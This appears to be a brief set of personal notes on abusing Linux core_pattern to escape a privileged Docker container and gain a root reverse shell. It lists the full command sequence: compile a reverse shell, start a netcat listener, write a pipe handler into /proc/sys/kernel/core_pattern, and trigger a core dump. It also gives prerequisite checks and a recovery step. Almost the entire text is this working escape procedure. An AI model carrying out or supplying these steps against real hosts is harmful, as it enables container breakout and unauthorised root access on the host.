# Linux Core_dump abuse

- imapct
    - use root permission to excute command

-Breakout Privileged
    - all
    - (unsure)

- change reverse_shell for attacker ip address

- action
    
    (on host)
    - gcc rever_shell.c -o rshell
    - sudo cp rshell /rshell
    - docker run -it --privileged ubuntu:22.04 bash
    (another terminal)
    - doocker exec -it 123 bash
    - nc -lvp 4444
    (back to the origin terminal)
    - echo "|/rshell" > /proc/sys/kernel/core_pattern
    - sleep 100
    - _\ (ctrl + blackslash)
    
    - get shell with root permission

- check before Operation
    - ulimit -c (if appear 0 excute ulimit -c unlimited)
    - systemctl status apport

- recovery command
    - sudo sysctl --system